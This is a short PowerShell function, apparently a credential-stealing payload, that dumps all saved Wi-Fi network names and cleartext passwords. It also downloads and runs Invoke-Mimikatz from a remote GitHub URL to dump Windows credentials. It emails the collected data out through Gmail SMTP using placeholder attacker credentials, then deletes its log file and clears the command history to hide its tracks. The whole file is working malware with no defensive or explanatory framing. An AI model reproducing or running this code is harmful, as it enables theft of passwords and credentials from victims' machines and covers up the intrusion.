function Get-Credentials{

<#$emailaddress = "youremail@gmail.com"
$emailpwd = "yourpassword"#>

$logfilepath = "$HOME\Desktop\"
$logfile = "$HOME\Desktop\a.txt"
if (!(test-path -path $logfile)){new-item -path $logfilepath -name "a.txt" -itemtype "file"}else{"" > $logfile}
Function LogWrite{Param ([string]$logstring);Add-content $Logfile -value $logstring}
$output = netsh wlan show profiles | select-string "Profil" | select-object -Skip 3
$computername = get-wmiobject Win32_ComputerSystem | select-object -expandproperty name
LogWrite "ComputerName: $computername";LogWrite ""
foreach ($string in $output){$ssid = ($string -split ":")[-1].Trim() -replace '"';$pwdstring = netsh wlan show profiles name="$ssid" key=clear | select-string "Schl" |select-object -Last 1;$wifipwd = ($pwdstring -split ":")[-1].Trim() -replace '"';LogWrite "SSID: '$ssid'   Password: '$wifipwd'"}
LogWrite "";LogWrite "";LogWrite "---------------------------------------------------------";LogWrite "";LogWrite "";
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
$mimikatz = Invoke-Mimikatz -DumpCreds
LogWrite $mimikatz
$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential("$emailaddress", "$emailpwd")
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = $emailaddress
$ReportEmail.To.Add($emailaddress)
$ReportEmail.Subject = 'some infos for you'
$ReportEmail.Body = (Get-Content $logfile | out-string)
$SMTPInfo.Send($ReportEmail)
remove-item -path $logfile
clear-history
}
